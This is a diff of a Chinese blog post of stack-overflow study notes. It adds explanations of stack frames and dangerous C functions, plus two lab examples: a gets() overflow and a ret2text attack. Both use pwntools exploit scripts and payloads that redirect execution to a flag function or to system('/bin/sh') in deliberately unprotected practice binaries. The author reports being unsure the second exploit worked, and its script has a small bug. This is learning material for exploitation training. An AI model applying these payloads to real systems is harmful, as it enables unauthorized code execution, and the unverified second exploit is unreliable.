@@ -16,16 +16,23 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta name="description" content="栈数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶  Push 将数据压入栈顶 Pop 将栈顶数据弹出    代码段：存放可执行程序的代码，可读不可写 数据段：存放程序中已经初始化的静态（全局）变量，可读写 bss段：存放程序中未初始化的静态（全局）变量，可读写 堆(heap)：存放动态分配的内容，需要程序员手动分配和释放 栈(stack)：存放局部变量，如函数的参数、返回地址、局部变量等">
+    <meta name="description" content="参考文章： https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;113504765?utm_source&#x3D;qq https:&#x2F;&#x2F;www.secpulse.com&#x2F;archives&#x2F;192491.html 栈数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶  Push 将数据压入栈顶 Pop 将栈顶数据弹出  栈帧：每个未完成运行的函数占用一个独立的连续区域，称作栈帧   代码段：存放">
 <meta property="og:type" content="article">
 <meta property="og:title" content="栈溢出原理及利用学习">
 <meta property="og:url" content="https://sinky.top/2022/11/10/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(%E5%BE%85%E8%A1%A5%E5%85%85)/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
-<meta property="og:description" content="栈数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶  Push 将数据压入栈顶 Pop 将栈顶数据弹出    代码段：存放可执行程序的代码，可读不可写 数据段：存放程序中已经初始化的静态（全局）变量，可读写 bss段：存放程序中未初始化的静态（全局）变量，可读写 堆(heap)：存放动态分配的内容，需要程序员手动分配和释放 栈(stack)：存放局部变量，如函数的参数、返回地址、局部变量等">
+<meta property="og:description" content="参考文章： https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;113504765?utm_source&#x3D;qq https:&#x2F;&#x2F;www.secpulse.com&#x2F;archives&#x2F;192491.html 栈数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶  Push 将数据压入栈顶 Pop 将栈顶数据弹出  栈帧：每个未完成运行的函数占用一个独立的连续区域，称作栈帧   代码段：存放">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://s2.loli.net/2022/11/11/RHinVQcJfPOgxSk.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/05/mZN8aUwqYc1sEv2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/05/MgIlq5V1mkWZ2H8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/05/s6xOwv8ShRoUt7k.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/06/U6nrtQwefZ5B9K4.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/06/LxCsYFB1tkHrOJj.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/06/4SFHQpMkERqGs7d.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/06/aLtQBMF5CeI2iwo.png">
 <meta property="article:published_time" content="2022-11-10T06:02:14.144Z">
-<meta property="article:modified_time" content="2022-11-29T06:01:20.492Z">
+<meta property="article:modified_time" content="2022-12-06T07:26:35.381Z">
 <meta property="article:author" content="Sinky">
 <meta property="article:tag" content="学习笔记">
 <meta property="article:tag" content="栈溢出">
@@ -226,7 +233,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k words
+          4.1k words
         
       </span>
     
@@ -237,7 +244,7 @@
         
         
         
-          11 mins
+          35 mins
         
       </span>
     
@@ -280,11 +287,15 @@
             
               <div class="markdown-body">
                 
-                <h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶</p>
+                <p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113504765?utm_source=qq">https://zhuanlan.zhihu.com/p/113504765?utm_source=qq</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/192491.html">https://www.secpulse.com/archives/192491.html</a></p>
+<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶</p>
 <ul>
 <li>Push 将数据压入栈顶</li>
 <li>Pop 将栈顶数据弹出</li>
 </ul>
+<p>栈帧：每个未完成运行的函数占用一个独立的连续区域，称作栈帧</p>
 <p><img src="https://s2.loli.net/2022/11/11/RHinVQcJfPOgxSk.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <ul>
 <li>代码段：存放可执行程序的代码，可读不可写</li>
@@ -315,6 +326,15 @@ naked call # 编译器不产生保存和恢复寄存器的代码，且不能用r
 <li>balabala</li>
 </ul>
 <p>在上一函数ebp入栈后，就开辟了被调函数的新栈帧，然后被调函数临时变量入栈。</p>
+<pre><code class="hljs">//调用前
+push arg3 //32位esp-4,64位esp-8
+push arg2
+push arg1
+call func // 压入当前指令地址，即保存返回地址，后jmp到调用函数的入口地址
+push ebp // 保存旧栈帧底部，在func执行完后再pop ebp
+mov ebp,ebp // 设置新栈帧的底部
+sub esp,xxx  // 设置新栈帧的顶部
+</code></pre>
 <p>（之前在一本书里学过，但是记得不那么清楚了）</p>
 <h3 id="函数调用结束"><a href="#函数调用结束" class="headerlink" title="函数调用结束"></a>函数调用结束</h3><p>函数调用结束，按照相反顺序将数据弹出栈：</p>
 <ul>
@@ -324,8 +344,134 @@ naked call # 编译器不产生保存和恢复寄存器的代码，且不能用r
 </ul>
 <p>返回地址即是用call指令调用函数时下一条指令的地址，存到eip中</p>
 <h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><p>栈溢出是指向栈中写入超出限定长度的数据，一处的数据覆盖栈中其他数据，从而影响程序运行，当攻击者计算好溢出长度，编写一处数据，用我们想要的地址数据覆盖函数返回地址，那么被调函数调用完返回主函数时，就会跳转到我们覆盖的地址，通过改变程序流程，达到利用的目的。</p>
-<h1 id="调试举例"><a href="#调试举例" class="headerlink" title="调试举例"></a>调试举例</h1><p>栈可以看成一个漏斗，栈底地址大，栈顶地址小，在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个额方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。</p>
+<p>目的：</p>
+<ul>
+<li>破坏程序内存结构</li>
+<li>执行system(‘/bin/sh’)</li>
+<li>执行shellcode</li>
+</ul>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><pre><code class="hljs">输入：gets scanf vxcanf
+输出：sprintf
+字符串：strcpy strcat bcopy
+</code></pre>
+<h1 id="简单栈溢出总结"><a href="#简单栈溢出总结" class="headerlink" title="简单栈溢出总结"></a>简单栈溢出总结</h1><ol>
+<li>寻找危险函数：<ol>
+<li>输入</li>
+<li>输出</li>
+<li>字符串</li>
+<li>gets()，直接读取一行，忽略’x00’</li>
+<li>scanf</li>
+<li>vscanf</li>
+<li>sprintf</li>
+<li>strncpy,字符串拼接，遇到’x00’停止</li>
+<li>strcat,字符串拼接，遇到’x00’停止</li>
+<li>bcopy</li>
+<li>寻找危险函数，快速确定程序是否有栈溢出，有则寻找位置</li>
+<li>常见危险函数</li>
+</ol>
+</li>
+<li>确定填充长度<ol>
+<li>覆盖函数返回地址，直接查看ebp即可</li>
+<li>覆盖栈上某个变量的内容，需计算</li>
+<li>覆盖bss段某个变量的内容</li>
+<li>根据实际情况覆盖特定变量或地址的内容</li>
+<li>相对于栈基地址的索引，可以直接通过查看ebp相对偏移量获得</li>
+<li>相对应栈顶指针的索引，需要进行调试</li>
+<li>直接地址索引，相当于直接给定了地址</li>
+</ol>
+</li>
+</ol>
+<p>栈可以看成一个漏斗，栈底地址大，栈顶地址小，在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个额方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。</p>
 <p>栈溢出属于缓冲区溢出，指程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p>
+<h1 id="调试举例"><a href="#调试举例" class="headerlink" title="调试举例"></a>调试举例</h1><h2 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h2><pre><code class="hljs">gets() # 不检查输入的字符串长度，用回车判断是否结束，很容易导致栈溢出
+</code></pre>
+<p>栗子：</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a2e602da8f7c" title="栈溢出原理">https://www.jianshu.com/p/a2e602da8f7c</a></p>
+<p>代码：</p>
+<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">success</span><span class="hljs-params">()</span></span>{<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"The flag is flag{Tri0mphe!!!}"</span>);<br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vulnerable</span><span class="hljs-params">()</span> </span>{<br>        <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>];<br>        <span class="hljs-built_in">gets</span>(s);<br>        <span class="hljs-built_in">puts</span>(s);<br>        <span class="hljs-keyword">return</span>;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">int</span> **argv)</span></span>{<br>        <span class="hljs-built_in">vulnerable</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p>文件命名为a.c</p>
+<p>扔进linux中编译<code>gcc -m32 -fno-stack-protector -no-pie a.c -o a </code></p>
+<p><code>-m32</code> 生成32位程序<br><code>-fno-stack-protector</code> 不开启堆栈溢出保护，即不生成canary</p>
+<p><code>-no-pie</code> 避免加载基址被打乱</p>
+<p>checksec一下：</p>
+<pre><code class="hljs">Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+</code></pre>
+<p>IDA分析：</p>
+<pre><code class="hljs">int vulnerable()
+{
+    char s[16]; // [esp+4h] [ebp-14h] BYREF
+    gets(s);
+    return puts(s);
+}
+</code></pre>
+<p>字符串s距离ebp长度为0x14，所以栈结构s为：</p>
+<p><img src="https://s2.loli.net/2022/12/05/mZN8aUwqYc1sEv2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>success()的地址为0x08048456</p>
+<p>构造payload:</p>
+<pre><code class="hljs">0x14*'a'+'bbbb'+success_addr
+</code></pre>
+<p>此时栈结构为：</p>
+<p><img src="https://s2.loli.net/2022/12/05/MgIlq5V1mkWZ2H8.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>exp:</p>
+<figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean"> # coding-utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> # 构造交互对象<br>p=process(<span class="hljs-string">'./a'</span>) <br> # flag函数地址<br>success_addr=<span class="hljs-number">0x08048456</span><br> # 构造payload<br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">'bbbb'</span>+p32(success_addr)<br> # 向程序发送字符串<br>p.sendline(payload)<br> # 将代码交互改为手动交互<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
+
+<p>成功！</p>
+<p><img src="https://s2.loli.net/2022/12/05/s6xOwv8ShRoUt7k.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>开NX保护，可以用ROP绕过，主要思路是在缓冲区溢出基础上，利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
+<p>gadgets是以ret结尾的指令序列，通过这个指令序列可以修改某些地址的内容，方便控制程序的执行流程</p>
+<p>利用指令集中ret指令，改变指令流的执行顺序。</p>
+<p>ROP攻击前提条件：</p>
+<ul>
+<li>程序存在溢出，并且可以控制返回地址</li>
+<li>可以找到满足条件的gadgest以及相应gadgets的地址</li>
+</ul>
+<h2 id="ret2text-待补充修改"><a href="#ret2text-待补充修改" class="headerlink" title="ret2text(待补充修改)"></a>ret2text(待补充修改)</h2><p>控制返回地址指向程序本身已有的的代码(.text)并执行。</p>
+<p>代码：两个子函数func()和sys，gets位置存在栈溢出，sys函数未被调用。</p>
+<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs scss"> <span class="hljs-selector-id">#include</span> &lt;stdlib<span class="hljs-selector-class">.h</span>&gt;<br>int <span class="hljs-built_in">sys</span>(){<br><span class="hljs-built_in">system</span>("/bin/sh");<br>}<br>int <span class="hljs-built_in">func</span>(){<br>char <span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[10]</span>;<br><span class="hljs-built_in">gets</span>(a);<br><span class="hljs-built_in">puts</span>(a);<br>}<br>int <span class="hljs-selector-tag">main</span>(){<br><span class="hljs-built_in">func</span>();<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p>编译：<code>gcc -g -fno-stack-protector -no-pie -o ret2text64 ret2text.c</code></p>
+<p>关闭canary和pie</p>
+<p>先checksec查看安全机制：</p>
+<p><img src="https://s2.loli.net/2022/12/06/U6nrtQwefZ5B9K4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>got表可写，开启NX保护，用rop</p>
+<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>我们需要覆盖通过func函数中局部变量a的溢出，覆盖func函数的返回地址，将其引导到sys函数地址就可以获取shell。</p>
+<p>需要：</p>
+<ol>
+<li>局部变量a的地址</li>
+<li>func函数的返回地址</li>
+<li>sys函数的地址</li>
+</ol>
+<h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><p>进入gdb-peda,在func()下断点调试：</p>
+<pre><code class="hljs">l # 查看源代码
+b 5 # 在第五行下断点
+r # 运行程序
+</code></pre>
+<p><img src="https://s2.loli.net/2022/12/06/LxCsYFB1tkHrOJj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<pre><code class="hljs">p &amp;a # 打印当前局部变量a的地址
+p $rbp # 打印rbp地址
+</code></pre>
+<p><img src="https://s2.loli.net/2022/12/06/4SFHQpMkERqGs7d.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>变量a地址为0xffe376</p>
+<p>rbp=0xffe380</p>
+<p>IDA找到sys函数地址为：0x400577</p>
+<p><img src="https://s2.loli.net/2022/12/06/aLtQBMF5CeI2iwo.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>func函数返回地址，在64位程序中，在rbp之后8字节，所以func_addr=rbp+8=0xffe388</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>分析payload构成，填充局部变量a直到返回地址，然后再将后面8个字节的位置填充为sys函数的地址。</p>
+<p>偏移长度=返回地址-局部变量地址=0x12=18</p>
+<pre><code class="hljs">payload='A'*18+p64(0x400577)
+</code></pre>
+<p>exp:</p>
+<pre><code class="hljs">from pwn import *
+p=process("./ret2text64")
+payload='A'*18+p64(0x400577)
+p.sendline(payload)
+p.interactive
+</code></pre>
+<p>但执行了exp之后，并没有给我什么显示，所以我不确定。</p>
 
                 
               </div>
